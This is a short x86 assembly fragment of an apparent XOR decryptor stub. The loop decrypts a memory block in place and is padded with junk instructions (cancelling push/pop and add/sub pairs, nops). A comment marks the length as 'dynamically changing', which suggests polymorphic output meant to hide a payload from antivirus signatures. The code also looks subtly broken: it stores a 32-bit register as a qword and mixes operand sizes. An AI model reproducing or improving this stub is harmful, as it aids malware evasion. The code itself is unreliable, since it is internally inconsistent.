nop
mov eax, 0x10E00 ; starting payload
push edx
pop edx
mov ecx, 0xBB ; length of not_encrypted block DYNAMICALLY CHANGING
nop
jmp decryptLoop

decryptLoop:
push edx
pop edx
sub eax, 8        ; move to the next byte
add esi, 5
sub esi, 5
mov ebx,[eax]

push edx
nop
pop edx
xor ebx,  ecx ; decrypt qword
add esi, 7
sub esi, 7
mov qword [eax], ebx
push edx
pop edx
sub ecx, 8
jnz decryptLoop